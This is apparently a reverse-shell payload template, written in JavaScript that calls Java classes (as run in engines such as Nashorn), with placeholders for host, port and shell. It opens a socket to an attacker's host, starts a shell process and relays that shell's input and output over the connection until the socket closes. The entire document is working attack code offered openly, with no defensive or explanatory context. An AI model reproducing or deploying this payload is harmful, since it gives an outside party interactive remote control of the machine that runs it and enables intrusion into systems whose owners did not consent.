// Open a new socket and connect to the attacker
var sock = new java.net.Socket("*\host*", *\port*);

// Start a shell process and merge stdout and stderr
var proc = new java.lang.ProcessBuilder("*\shell*").redirectErrorStream(true).start();

// Input and output streams
var pi = proc.getInputStream();     // stdout and stderr of the shell
var po = proc.getOutputStream();    // stdin of the shell
var si = sock.getInputStream();     // stdout of the socket
var so = sock.getOutputStream();    // stdin of the socket

while (!sock.isClosed()) {
    // Read output from shell (if there is any) and write to socket input
    while (pi.available() > 0) so.write(pi.read());

    // Read output from socket (if there is any) and write to shell input
    while (si.available() > 0) po.write(si.read());

    // Flush data to ensure it's sent and received immediately
    so.flush();
    po.flush();

    // Optional: short sleep to reduce CPU usage
    java.lang.Thread.sleep(100);
}

proc.destroy();
sock.close();
